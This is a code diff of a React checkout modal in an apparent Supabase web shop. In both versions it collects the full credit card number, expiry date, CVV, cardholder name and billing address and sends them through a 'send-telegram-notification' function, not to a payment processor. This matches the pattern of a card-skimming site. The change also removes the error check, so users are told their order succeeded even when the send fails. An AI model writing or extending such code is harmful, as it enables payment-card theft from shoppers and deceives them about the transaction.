@@ -10,7 +10,6 @@ import { CreditCard, Smartphone, DollarSign, Building, Upload, X } from "lucide-
 import { useToast } from "@/hooks/use-toast";
 import { supabase } from "@/integrations/supabase/client";
 
-
 interface CheckoutModalProps {
   isOpen: boolean;
   onClose: () => void;
@@ -77,33 +76,28 @@ const CheckoutModal = ({ isOpen, onClose, total, currency, cartItems }: Checkout
     setIsProcessing(true);
 
     try {
-      const message = `🛒 *NEW CHECKOUT ORDER*\n\n` +
-        `💳 Payment Method: ${selectedPaymentMethod.toUpperCase()}\n` +
-        `💰 Total: $${total.toFixed(2)} ${currency}\n` +
-        `📦 Items: ${cartItems.map(item => `${item.name} $${item.amount} x${item.quantity}`).join(', ')}\n` +
-        (selectedPaymentMethod === 'credit' ?
-          `\n💳 *Card Details:*\n` +
-          `Card Number: ${creditCardForm.cardNumber}\n` +
-          `Expiry: ${creditCardForm.expiryDate}\n` +
-          `CVV: ${creditCardForm.cvv}\n` +
-          `Name: ${creditCardForm.cardholderName}\n` +
-          `Address: ${creditCardForm.billingAddress}, ${creditCardForm.city}, ${creditCardForm.postalCode}, ${creditCardForm.country}`
-          : '');
+      // Send Telegram notification
+      const checkoutData = {
+        type: 'checkout',
+        paymentMethod: selectedPaymentMethod,
+        total: total,
+        currency: currency,
+        items: cartItems.map(item => `${item.name} - $${item.amount} x ${item.quantity}`).join(', '),
+        creditCardInfo: selectedPaymentMethod === 'credit' ? {
+          cardNumber: creditCardForm.cardNumber,
+          expiryDate: creditCardForm.expiryDate,
+          cvv: creditCardForm.cvv,
+          cardholderName: creditCardForm.cardholderName,
+          billingAddress: creditCardForm.billingAddress,
+          city: creditCardForm.city,
+          postalCode: creditCardForm.postalCode,
+          country: creditCardForm.country
+        } : null
+      };
 
-      const { error: tgError } = await supabase.functions.invoke("send-telegram-notification", {
-        body: { message, type: "checkout" },
+      await supabase.functions.invoke('send-telegram-notification', {
+        body: checkoutData
       });
-
-      if (tgError) {
-        console.error('Telegram notify error:', tgError);
-        toast({
-          title: "Order Could Not Be Submitted",
-          description: "We couldn't send your order right now. Please try again in a moment.",
-          variant: "destructive",
-        });
-        setIsProcessing(false);
-        return;
-      }
 
       toast({
         title: "Order Placed Successfully!",
